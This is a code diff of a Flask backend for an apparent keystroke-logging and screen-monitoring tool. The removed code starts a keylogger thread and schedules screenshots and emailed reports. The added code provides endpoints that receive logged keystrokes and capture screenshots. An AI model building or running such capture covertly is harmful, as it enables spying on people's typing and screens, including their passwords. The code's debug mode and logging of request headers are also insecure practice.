@@ -1,66 +1,59 @@
-from flask import Flask, request, jsonify
+from flask import Flask, jsonify, request
 from flask_cors import CORS
-import threading
-import schedule
-import time
+import psycopg2
 import os
 from dotenv import load_dotenv
-import db
-from modules.keylogger import Keylogger
-from modules.screenshot import capture_screenshot
-from modules.email_sender import send_report
 
 # Load environment variables
 load_dotenv()
 
 app = Flask(__name__)
-CORS(app)  # Enable CORS for frontend communication
+CORS(app)
 
-# Initialize keylogger
-keylogger = Keylogger()
+# Connect to Supabase PostgreSQL
+def get_db_connection():
+    return psycopg2.connect(
+        dbname=os.getenv("DB_NAME"),
+        user=os.getenv("DB_USER"),
+        password=os.getenv("DB_PASS"),
+        host=os.getenv("DB_HOST"),
+        port=os.getenv("DB_PORT")
+    )
 
-# Global monitoring status
-monitoring_active = False
+@app.route('/log_keystroke', methods=['POST'])
+def log_keystroke():
+    print(f"Request Method: {request.method}")
+    print(f"Request Headers: {request.headers}")
+    print(f"Request Data: {request.get_json()}")
 
-@app.route("/start_monitoring", methods=["POST"])
-def start_monitoring():
-    """Start keylogging, screenshots, and report generation."""
-    global monitoring_active
-    if monitoring_active:
-        return jsonify({"status": "already running"}), 400
+    data = request.get_json()
+    if not data or 'user_id' not in data or 'key_text' not in data:
+        return jsonify({'error': 'Invalid request'}), 400
+    
+    return jsonify({'message': 'Keystroke logged successfully'}), 200
 
-    monitoring_active = True
 
-    # Start keylogger
-    keylogger_thread = threading.Thread(target=keylogger.start)
-    keylogger_thread.daemon = True
-    keylogger_thread.start()
+import pyautogui
+from datetime import datetime
 
-    # Schedule screenshot capture
-    schedule.every(int(os.getenv("SHOT_TIME", 30))).seconds.do(capture_screenshot)
+@app.route('/capture_screenshot', methods=['POST'])
+def capture_screenshot():
+    try:
+        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
+        filename = f"screenshot_{timestamp}.png"
+        filepath = os.path.join("screenshots", filename)
+        
+        # Ensure the "screenshots" folder exists
+        os.makedirs("screenshots", exist_ok=True)
 
-    # Schedule report sending
-    schedule.every(int(os.getenv("REPORT_INT", 60))).seconds.do(send_report)
+        # Capture the screenshot
+        screenshot = pyautogui.screenshot()
+        screenshot.save(filepath)
 
-    return jsonify({"status": "monitoring started"}), 200
+        return jsonify({"message": "Screenshot captured", "file": filename}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
-@app.route("/stop_monitoring", methods=["POST"])
-def stop_monitoring():
-    """Stop keylogging, screenshots, and reports."""
-    global monitoring_active
-    if not monitoring_active:
-        return jsonify({"status": "already stopped"}), 400
-
-    monitoring_active = False
-    schedule.clear()  # Stop all scheduled tasks
-
-    return jsonify({"status": "monitoring stopped"}), 200
-
-@app.route("/logs", methods=["GET"])
-def get_logs():
-    """Retrieve keylogs from database."""
-    logs = db.get_logs()
-    return jsonify({"logs": logs})
 
 if __name__ == "__main__":
     app.run(debug=True)
